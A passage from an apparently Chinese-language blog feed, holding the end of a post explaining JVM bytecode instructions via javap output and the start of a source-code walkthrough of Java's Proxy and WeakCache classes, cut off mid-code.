解析之后，我们将看到下列内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">Classfile /Users/fangfeng/WorkPkg/lab/src/main/java/me/fangfeng/asm/Test.class</span><br><span class="line">  Last modified Jul 23, 2018; size 357 bytes</span><br><span class="line">  MD5 checksum bb1940cc6534d789359295b8dc80233b</span><br><span class="line">  Compiled from &quot;Test.java&quot;</span><br><span class="line">public class me.fangfeng.asm.Test</span><br><span class="line">  minor version: 0</span><br><span class="line">  major version: 52</span><br><span class="line">  flags: ACC_PUBLIC, ACC_SUPER</span><br><span class="line">Constant pool:</span><br><span class="line">   #1 = Methodref          #4.#17         // java/lang/Object.&quot;&lt;init&gt;&quot;:()V</span><br><span class="line">   #2 = Fieldref           #3.#18         // me/fangfeng/asm/Test.number:I</span><br><span class="line">   #3 = Class              #19            // me/fangfeng/asm/Test</span><br><span class="line">   #4 = Class              #20            // java/lang/Object</span><br><span class="line">   #5 = Utf8               number</span><br><span class="line">   #6 = Utf8               I</span><br><span class="line">   #7 = Utf8               &lt;init&gt;</span><br><span class="line">   #8 = Utf8               ()V</span><br><span class="line">   #9 = Utf8               Code</span><br><span class="line">  #10 = Utf8               LineNumberTable</span><br><span class="line">  #11 = Utf8               getNumber</span><br><span class="line">  #12 = Utf8               ()I</span><br><span class="line">  #13 = Utf8               setNumber</span><br><span class="line">  #14 = Utf8               (I)V</span><br><span class="line">  #15 = Utf8               SourceFile</span><br><span class="line">  #16 = Utf8               Test.java</span><br><span class="line">  #17 = NameAndType        #7:#8          // &quot;&lt;init&gt;&quot;:()V</span><br><span class="line">  #18 = NameAndType        #5:#6          // number:I</span><br><span class="line">  #19 = Utf8               me/fangfeng/asm/Test</span><br><span class="line">  #20 = Utf8               java/lang/Object</span><br><span class="line">&#123;</span><br><span class="line">  public me.fangfeng.asm.Test();</span><br><span class="line">    descriptor: ()V</span><br><span class="line">    flags: ACC_PUBLIC</span><br><span class="line">    Code:</span><br><span class="line">      stack=1, locals=1, args_size=1</span><br><span class="line">         0: aload_0</span><br><span class="line">         1: invokespecial #1                  // Method java/lang/Object.&quot;&lt;init&gt;&quot;:()V</span><br><span class="line">         4: return</span><br><span class="line">      LineNumberTable:</span><br><span class="line">        line 3: 0</span><br><span class="line"></span><br><span class="line">  public int getNumber();</span><br><span class="line">    descriptor: ()I</span><br><span class="line">    flags: ACC_PUBLIC</span><br><span class="line">    Code:</span><br><span class="line">      stack=1, locals=1, args_size=1</span><br><span class="line">         0: aload_0</span><br><span class="line">         1: getfield      #2                  // Field number:I</span><br><span class="line">         4: ireturn</span><br><span class="line">      LineNumberTable:</span><br><span class="line">        line 8: 0</span><br><span class="line"></span><br><span class="line">  public void setNumber(int);</span><br><span class="line">    descriptor: (I)V</span><br><span class="line">    flags: ACC_PUBLIC</span><br><span class="line">    Code:</span><br><span class="line">      stack=2, locals=2, args_size=2</span><br><span class="line">         0: aload_0</span><br><span class="line">         1: iload_1</span><br><span class="line">         2: putfield      #2                  // Field number:I</span><br><span class="line">         5: return</span><br><span class="line">      LineNumberTable:</span><br><span class="line">        line 12: 0</span><br><span class="line">        line 13: 5</span><br><span class="line">&#125;</span><br><span class="line">SourceFile: &quot;Test.java&quot;</span><br></pre></td></tr></table></figure><p>打印出来的内容包括有 类的全限定名，访问控制权限，父类，接口，常量池以及各个方法。</p><p>以 <code>getNumber</code> 为例:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">public int getNumber();</span><br><span class="line">  descriptor: ()I</span><br><span class="line">  flags: ACC_PUBLIC</span><br><span class="line">  Code:</span><br><span class="line">    stack=1, locals=1, args_size=1</span><br><span class="line">       0: aload_0</span><br><span class="line">       1: getfield      #2                  // Field number:I</span><br><span class="line">       4: ireturn</span><br><span class="line">    LineNumberTable:</span><br><span class="line">      line 8: 0</span><br></pre></td></tr></table></figure><ul><li>descriptor: 表示方法描述符，其中 <code>()</code> 内容表示入参，<code>I</code> 表示返回值的类型</li><li>flags     : 表示方法的访问权限，当前限定为 <code>public</code></li><li>Code      : 存储有当前方法体指令码的一种方法内部属性。<ul><li>stack : 表示当前方法(意即在运行时所处的栈帧，每个方法的调用都将在 <code>虚拟机栈</code> 中构建一个新的 <code>栈帧</code>) 使用的 <code>操作数栈的最大深度</code></li><li>locals: 表示当前方法使用的 <code>局部变量表</code> 的大小</li><li>args_size : 表示变量个数</li><li>LineNumberTable : 与 Debug 有关，指当前的的指令集在源文件中的第几行开始</li></ul></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0: aload_0              // 从局部变量表中加载 0 号元素到操作数栈中</span><br><span class="line">1: getfield #2          // 获取常量池中 2 号元素(即 Field number:I) 的值，并加载到操作数栈中</span><br><span class="line">4: ireturn              // 抛出当前操作数栈顶元素作为返回值</span><br></pre></td></tr></table></figure><p>其中，每条指令前的 0, 1, 4 指当前指令作为 <code>Code</code> 属性的内容的偏移量。</p><p>换一句话说，<code>aload_0</code> 是 Code 属性 code[] 的第 0 个字节的内容<br><code>getfield #2</code> 的是从 code[] 的第 1 个字节开始的。<br><code>ireturn</code> 是从 code[] 的第 4 个字节开始。</p><p>至于为什么每条指令的开始位置不同，这取决于每条指令的长度。<code>aload_0</code> 指令本身为 1 字节的长度，且不要求附带操作数。<br><code>getfield</code> 指令自长 1 个字节，但需要一个长度为 2 字节的常量池索引。因此 <code>ireturn</code> 将从第 4 字节开始</p><hr><p>同时，可能有人会有所疑问，<code>aload_0</code> 加载的 0 号元素是什么？它貌似没有被用到？</p><p>首先，在每个方法被触发，在构建新的栈帧时，<code>this</code> 将自动作为 0 号元素被存入新栈帧的局部变量表作为 0 号元素。<br>同时，如果方法有入参，则入参按入参声明顺序依次作为 1, 2, 3, … 元素存入。<br>(当然，这里存在特殊情况，诸如 long, double 这样长为 8 字节的元素，将占用 2 个局部变量表的数组下标，而其他元素顺延)。</p><p>至于看似 0 号元素 <code>this</code> 并没有被用到。事实上，它是作为 <code>getfield</code> 的一个限定被使用的。<br>试想，<code>getfield</code> 虽然通过 <code>#2</code> 能够知道需要获取到的变量名为 <code>number</code> 类型为 <code>I(即 int)</code> 的元素。但是，这个元素究竟属于哪个实例？<br>而操作数栈顶的 <code>this</code> 恰恰是指明，需要使用当前方法所在的类的 number 变量。</p><hr><p>类似的，我们看一下 <code>setNumber</code> 方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0: aload_0              // 从局部变量表中加载 0 号元素到操作数栈中 (用于确定字段所属的类)</span><br><span class="line">1: iload_1              // 从局部变量表中加载 1 号元素到操作数栈中 (用于确定将要给字段赋的值)</span><br><span class="line">2: putfield      #2     // 获取常量池中 2 号元素(即 Field number:I) 的地址，并赋值</span><br><span class="line">5: return               // 无返回值的 return 指令来结束当前栈帧的执行</span><br></pre></td></tr></table></figure><h2 id="给变量赋初始值"><a href="#给变量赋初始值" class="headerlink" title="给变量赋初始值"></a>给变量赋初始值</h2><p>经常会见到在方法体内部有类似这样的声明 <code>int score = 100</code> ，那么这样的内容翻译成指令会是如何？</p><p>对于较小的值，例如 100，将通过 <code>bipush 100</code>, <code>istore_1(假设用局部变量表 1 号元素存储 score 变量</code> 类似的形式进行赋值。<br>类似的，还是 <code>sipush</code> ，两者的区别是 bipush 可以支持 1 字节大小的整数，sipush 支持 2 字节大小的整数。</p><p>但是，int 最大可是可以到达 4 字节，更甚者，long 将达到 8 字节。</p><p>这时候，将要借助的就是 <code>ldc #&lt;index&gt;</code> 用来读取常量池编号小于 128 的常量(例如整数常量，浮点常量等等)<br>那么，超出 128 编号的？使用 <code>ldc_w #&lt;index&gt;</code> 读取 2 字节内容作为编号，最大 65535。当然，更大的内容，常量池都不能支持了哈。</p><p>同时，区别于将 byte, short, int, float 统一作为 4 字节结果读取，对于 long, double 这样的八字节元素，使用 <code>ldc2_w</code></p><h2 id="控制结构"><a href="#控制结构" class="headerlink" title="控制结构"></a>控制结构</h2><p>作为一门图灵完备的语言，至少，控制结构是必不可少的元素。</p><p>那么，类似 <code>for(int i=0;i&lt;10;i++)</code> 的 Java 代码编译成指令到底是什么样的呢？</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0: iconst_0                     // 赋值指令，往操作数栈顶添加整数值 0</span><br><span class="line">1: istore_1                     // 将操作数栈顶的元素存入局部变量表 1 号位置</span><br><span class="line">2: iload_1                      // 从局部变量表 1 号位置加载元素到操作数栈</span><br><span class="line">3: bipush        10             // 往操作数栈顶压入 byte 型值 10</span><br><span class="line">5: if_icmpge     21             // 将操作数栈顶的两个元素进行比较, 如果 次顶部元素 &gt;= 顶部元素，则重定向到偏移量为 21 的指令</span><br><span class="line">//  for (...) &#123;&#125; 语句块的内容</span><br><span class="line">15: iinc          1, 1          // 将局部变量表的 1 号位置元素 +1</span><br><span class="line">18: goto          2             // 跳转到偏移量为 2 的指令</span><br><span class="line">21: return                      // 调用无返回值的 return</span><br></pre></td></tr></table></figure><p>类似的，<code>if(...)</code> 语句的比较较之 <code>for(;;)</code> 就更为简单。类比偏移量为 5 的指令即可。</p><h2 id="调用方法"><a href="#调用方法" class="headerlink" title="调用方法"></a>调用方法</h2><p>JVM 指令集中总计有 4 种调用方法的指令，包括有: </p><ul><li><code>invokevirtual</code>, 对普通实例方法的调用，将根据对象类型进行分发调用</li><li><code>invokestatic</code>, 对静态方法的调用</li><li><code>invokespecial</code>, 用于调用类的初始化方法，也用于调用父类方法和私有方法</li><li><code>invokeinterface</code>, 用于调用接口方法</li></ul><p>以执行 <code>System.out.println()</code> 为例<br>假设常量池内容存在目标元素(具体以相应注释为准)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">getstatic     #3                  // Field java/lang/System.out:Ljava/io/PrintStream;</span><br><span class="line">invokevirtual #4                  // Method java/io/PrintStream.println:()V</span><br></pre></td></tr></table></figure><h2 id="More"><a href="#More" class="headerlink" title="More"></a>More</h2><p>更多内容，包括: 如何实例化一个对象，如何抛出及处理异常，代码同步声明等，暂且不表。</p><p>有时间再做补充</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">  __                    __                  </span><br><span class="line"> / _| __ _ _ __   __ _ / _| ___ _ __   __ _ </span><br><span class="line">| |_ / _` | &apos;_ \ / _` | |_ / _ \ &apos;_ \ / _` |</span><br><span class="line">|  _| (_| | | | | (_| |  _|  __/ | | | (_| |</span><br><span class="line">|_|  \__,_|_| |_|\__, |_|  \___|_| |_|\__, |</span><br><span class="line">                 |___/                |___/</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在之前描述过包括 ASM, CGlib, Java Proxy 的基本内容之后，本文将就更为基础的 JVM 指令集进行简单而有效的介绍。&lt;/p&gt;
&lt;p&gt;当然，在开始正文前，读者需要了解到，JVM 指令集这种类似于汇编的规范性内容，包含一百多个指令，若要求一一介绍。&lt;br&gt;那么，直接阅读 &lt;a href=&quot;https://docs.oracle.com/javase/specs/jvms/se8/html/index.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;官方文档&lt;/a&gt; 绝对是比本文的内容更为详实且准确。&lt;/p&gt;
&lt;p&gt;这篇文档的目的，只是为了使读者建立起关于 JVM 指令集基本的常识性观念。&lt;/p&gt;
    
    </summary>
    
    
      <category term="JVM" scheme="https://DorMOUSE-None.github.io/tags/JVM/"/>
    
      <category term="Instruction" scheme="https://DorMOUSE-None.github.io/tags/Instruction/"/>
    
  </entry>
  
  <entry>
    <title>Java Proxy 源码解析</title>
    <link href="https://DorMOUSE-None.github.io/2018-07-20-Java-Proxy/"/>
    <id>https://DorMOUSE-None.github.io/2018-07-20-Java-Proxy/</id>
    <published>2018-07-19T16:00:00.000Z</published>
    <updated>2018-07-21T22:38:18.419Z</updated>
    
    <content type="html"><![CDATA[<p>在 Java 整个生态里面, 通用的有两类动态代理的应用: Java Proxy 与 CGlib 代理。</p><p>从宽泛的区别来说，Java Proxy 只能对接口进行增强，而 CGlib 同时适用于类和接口的增强。<br>而且，业内普遍的认知是，CGlib 动态代理较之于 Java Proxy 在生成字节码的速度上也更为高效。</p><a id="more"></a><h2 id="从实例开始…"><a href="#从实例开始…" class="headerlink" title="从实例开始…"></a>从实例开始…</h2><p>下面，首先来了解一下 Java Proxy 的使用编码:</p><p>ICodeFactory 接口, 作为将被 Java 动态代理增强的基本接口<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">ICodeFactory</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function">Code <span class="title">getCode</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">setCode</span><span class="params">(Code code)</span></span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>CodeFactory 类, 作为 ICodeFactory 接口的实现类。被视为是真正被动态代理增强的内容，:) 因为接口方法并不存在方法体(当然，Java 8 及以上的 default 请容我忽视)<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CodeFactory</span> <span class="keyword">implements</span> <span class="title">ICodeFactory</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Code code;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Code <span class="title">getCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Code();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setCode</span><span class="params">(Code code)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.code = code;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>辅助类 Code 的内容(简单写，请忽略不符合实际编程规范的一些内容):<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Code</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> codeA;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String codeB;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>构建增强的代码逻辑:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main(String[]) 方法</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 内部匿名类，用于动态代理生成类的构造方法及其它内容，后面讲。</span></span><br><span class="line">    InvocationHandler handler = <span class="keyword">new</span> InvocationHandler() &#123;</span><br><span class="line"></span><br><span class="line">        Object obj = <span class="keyword">new</span> CodeFactory();</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (method.getName() == <span class="string">"getCode"</span>) &#123;</span><br><span class="line">                Code code = (Code) method.invoke(obj, args);</span><br><span class="line">                code.codeA = code.codeA + <span class="number">100</span>;</span><br><span class="line">                code.codeB = <span class="string">"Proxied: "</span> + code.codeB;</span><br><span class="line">                <span class="keyword">return</span> code;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> method.invoke(obj, args);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 构建生成类实例</span></span><br><span class="line">    Class&lt;?&gt; clazz = Proxy.getProxyClass(ICodeFactory.class.getClassLoader(), ICodeFactory.class);</span><br><span class="line">    <span class="comment">// 获取生成类对象</span></span><br><span class="line">    ICodeFactory factory = (ICodeFactory) clazz.getConstructor(<span class="keyword">new</span> Class[] &#123; InvocationHandler.class &#125;).newInstance(<span class="keyword">new</span> Object[] &#123; handler &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用 getCode() 方法</span></span><br><span class="line">    Code code = factory.getCode();</span><br><span class="line">    <span class="comment">// 打印参数</span></span><br><span class="line">    System.out.println(code.codeA);</span><br><span class="line">    System.out.println(code.codeB);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>从默认预期来讲，我们是对接口进行增强。接口方法不存在方法体，也许将在 <code>factory.getCode()</code> 时执行失败？<br>或者结合已有的认知，成功调用 <code>CodeFactory.getCode()</code> 方法，并获得 <code>new Code()</code> 。</p><p>那么，<code>code.codeA</code> <code>code.codeB</code> 的具体值将是什么？</p><p>执行结果将是:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">100</span><br><span class="line">Proxied: null</span><br></pre></td></tr></table></figure><h2 id="了解-Proxy-的内容逻辑"><a href="#了解-Proxy-的内容逻辑" class="headerlink" title="了解 Proxy 的内容逻辑"></a>了解 Proxy 的内容逻辑</h2><p>从 <code>Proxy.getProxyClass(ClassLoader, Class&lt;?&gt;...)</code> 入手，下面将展开对 <code>Proxy</code> 具体执行逻辑的探究。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; getProxyClass(ClassLoader loader, Class&lt;?&gt;... interfaces) <span class="keyword">throws</span> IllegalArgumentException &#123;</span><br><span class="line">    <span class="comment">// 对 interfaces 数组的浅拷贝</span></span><br><span class="line">    <span class="keyword">final</span> Class&lt;?&gt;[] intfs = interfaces.clone();</span><br><span class="line">    <span class="keyword">final</span> SecurityManager sm = System.getSecurityManager();</span><br><span class="line">    <span class="keyword">if</span> (sm != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 如果配置了安全管理器，那么需要确认 Proxy 有创建新的代理类的许可</span></span><br><span class="line">        checkProxyAccess(Reflection.getCallerClass(), loader, intfs);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用 </span></span><br><span class="line">    <span class="keyword">return</span> getProxyClass0(loader, intfs);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Class&lt;?&gt; getProxyClass0(ClassLoader loader, Class&lt;?&gt;... interfaces) &#123;</span><br><span class="line">    <span class="comment">// 确认需要进行增强的接口数量少于等于 65535，详细原因请去了解 ClassFile 规范(规范中的接口上限)</span></span><br><span class="line">    <span class="keyword">if</span> (interfaces.length &gt; <span class="number">65535</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"interface limit exceeded"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果需要由指定 ClassLoader 加载, 实现给定 interfaces 的代理类已经存在, </span></span><br><span class="line">    <span class="comment">// 将直接返回已经缓存过的拷贝</span></span><br><span class="line">    <span class="comment">// 否则，通过 ProxyClassFactory 创建新的代理类</span></span><br><span class="line">    <span class="keyword">return</span> proxyClassCache.get(loader, interfaces);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在需要额外来考察一下 proxyClassCache 的具体类型。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> WeakCache&lt;ClassLoader, Class&lt;?&gt;[], Class&lt;?&gt;&gt;</span><br><span class="line">        proxyClassCache = <span class="keyword">new</span> WeakCache&lt;&gt;(<span class="keyword">new</span> KeyFactory(), <span class="keyword">new</span> ProxyClassFactory());</span><br></pre></td></tr></table></figure><p><code>WeakCache</code>, 从名称来将，是一个缓存，同时应该使用了 WeakReference 技术</p><p>进入 <code>WeakCache.get(...)</code> 方法体</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> V <span class="title">get</span><span class="params">(K key, P parameter)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// parameter 传入的是接口数组，要求不能为空</span></span><br><span class="line">    Objects.requireNonNull(parameter);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 删除过期元素</span></span><br><span class="line">    expungeStaleEntries();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 构建一个 WeakReference 对象(key 表示 ClassLoader)</span></span><br><span class="line">    Object cacheKey = CacheKey.valueOf(key, refQueue);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// lazily install the 2nd level valuesMap for the particular cacheKey</span></span><br><span class="line">    ConcurrentMap&lt;Object, Supplier&lt;V&gt;&gt; valuesMap = map.get(cacheKey);</span><br><span class="line">    <span class="keyword">if</span> (valuesMap == <span class="keyword">null</span>) &#123;</span><br><span class="line">        ConcurrentMap&lt;Object, Supplier&lt;V&gt;&gt; oldValuesMap</span><br><span class="line">                = map.putIfAbsent(cacheKey,</span><br><span class="line">                valuesMap = <span class="keyword">new</span> ConcurrentHashMap&lt;&gt;());</span><br><span class="line">        <span class="keyword">if</span> (oldValuesMap != <span class="keyword">null</span>) &#123;</span><br><span class="line">            valuesMap = oldValuesMap;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建次级 Key</span></span><br><span class="line">    <span class="comment">// 同时检索是否存在过去有同一个 ClassLoader 加载的表示 Supplier&lt;V&gt;</span></span><br><span class="line">    Object subKey = Objects.requireNonNull(subKeyFactory.apply(key, parameter));</span><br><span class="line">    Supplier&lt;V&gt; supplier = valuesMap.get(subKey);</span><br><span class="line">    Factory factory = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (supplier != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">// supplier might be a Factory or a CacheValue&lt;V&gt; instance</span></span><br><span class="line">            <span class="comment">// 最终 supplier 将非空，同时调用 .get() 方法获取 Class 类</span></span><br><span class="line">            V value = supplier.get();</span><br><span class="line">            <span class="keyword">if</span> (value != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> value;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// else no supplier in cache</span></span><br><span class="line">        <span class="comment">// or a supplier that returned null (could be a cleared CacheValue</span></span><br><span class="line">        <span class="comment">// or a Factory that wasn't successful in installing the CacheValue)</span></span><br><span class="line">        <span class="comment">// 未找到过去加载的记录</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 懒加载一个 Factory </span></span><br><span class="line">        <span class="keyword">if</span> (factory == <span class="keyword">null</span>) &#123;</span><br><span class="line">            factory = <span class="keyword">new</span> Factory(key, parameter, subKey, valuesMap);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (supplier == <span class="keyword">null</span>) &#123;</span><br><span class="line">            supplier = valuesMap.putIfAbsent(subKey, factory);</span><br><span class="line">            <span class="keyword">if</span> (supplier == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="comment">// successfully installed Factory</span></span><br><span class="line">                supplier = factory;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// else retry with winning supplier</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> 